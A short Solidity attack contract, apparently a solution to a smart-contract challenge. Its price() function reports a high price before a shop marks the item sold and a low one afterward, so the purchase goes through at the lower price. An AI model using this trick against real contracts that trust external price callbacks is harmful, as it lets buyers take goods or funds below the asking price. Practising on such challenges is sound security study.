// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract Buyer {
    bool private priceCalls = true;
    IShop shopContract;

    constructor(address _instance) {
        shopContract = IShop(_instance);
    }   

    function price() public view returns (uint256) {
        if (shopContract.isSold()) {
            return 1;
        } else {
            return 100;
        }
    }

    function shop() public {
        shopContract.buy();
    }
}
